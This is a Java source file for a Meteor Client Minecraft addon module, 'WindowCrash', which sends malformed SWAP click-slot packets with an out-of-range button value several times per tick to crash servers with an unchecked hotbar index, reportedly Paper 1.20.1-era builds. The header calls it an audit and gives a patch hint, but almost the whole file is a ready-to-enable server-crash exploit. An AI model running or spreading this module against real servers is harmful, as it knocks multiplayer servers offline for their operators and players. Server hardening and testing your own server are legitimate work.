package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.ScreenHandler;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.screen.sync.ItemStackHash;

/**
 * AUDIT: Window Crash (SWAP click with out-of-range button)
 *
 * Sends ClickSlotC2SPacket with slot = 36, action = SWAP, and button = −1.
 * For a SWAP action, the button byte encodes the target hotbar key (0–8);
 * −1 is outside that range. A window handler that uses the button value as
 * a direct hotbar array index without bounds-checking will throw an
 * ArrayIndexOutOfBoundsException. Paper 1.20.1-era builds had exactly this
 * vulnerability in their SWAP handler.
 *
 * Distinct from ErrorCrash (which uses a maximally-malformed packet): this
 * module sends a nearly-valid packet — correct syncId, valid revision, a real
 * slot — and only the button byte is wrong. It tests the specific SWAP
 * code path's parameter validation, not the general click handler.
 *
 * Patch signal: at the entry point of the SWAP handler, validate that the
 * button value is in [0, 8] before using it as a hotbar array index; reject
 * out-of-range button values with a graceful resync, never let them reach
 * array access.
 *
 * Requires an open container. Run against your OWN local server only.
 */
public class WindowCrash extends Module {
    private final SettingGroup sgGeneral = settings.createGroup("Crash");

    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
        .name("packets-per-tick").description("Packets sent each tick.")
        .defaultValue(6).min(1).sliderMax(12).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;
    private boolean kicked = false;

    public WindowCrash() {
        super(AddonTemplate.CRASH_CATEGORY, "window-crash",
            "Sends SWAP click-slot packets with an out-of-range slot. Targets Paper 1.20.1-era window handling.");
    }

    @Override
    public void onActivate() { ticksActive = 0; packetsSent = 0; kicked = false; }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null || mc.player.currentScreenHandler == null) return;
        ticksActive++;
        ScreenHandler handler = mc.player.currentScreenHandler;
        for (int i = 0; i < packets.get() + 1; i++) {
            mc.player.networkHandler.sendPacket(new ClickSlotC2SPacket(
                handler.syncId, handler.getRevision(),
                (short) 36, (byte) -1, SlotActionType.SWAP,
                new Int2ObjectOpenHashMap<>(), ItemStackHash.EMPTY));
            packetsSent++;
        }
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) {
            info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
            info("  Server kicked: %s", kicked ? "YES — rejection detected" : "no kick observed");
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        kicked = true;
        if (autoDisable.get() && isActive()) toggle();
    }
}
